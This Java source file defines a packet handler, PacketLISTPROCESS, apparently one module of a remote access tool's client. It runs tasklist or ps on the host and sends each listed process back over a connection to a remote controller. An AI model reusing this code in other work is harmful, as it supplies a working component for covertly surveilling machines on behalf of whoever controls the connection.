package com.redpois0n.packets;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import com.redpois0n.Connection;
import com.redpois0n.common.OperatingSystem;


public class PacketLISTPROCESS extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		try {
			Process p = null;
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				p = Runtime.getRuntime().exec("tasklist.exe /fo csv /nh");
			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
				p = Runtime.getRuntime().exec("ps -x");
			}
			
			if (p != null) {
				BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));

				while ((line = input.readLine()) != null) {
					if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
						if (!line.trim().equals("")) {
							Connection.addToSendQueue(new PacketBuilder(Header.PROCESS, line));
						}
					} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
						Connection.addToSendQueue(new PacketBuilder(Header.PROCESS, line));
					}
				}
				input.close();
			}
		} catch (Exception err) {
			err.printStackTrace();
		}
	}

}
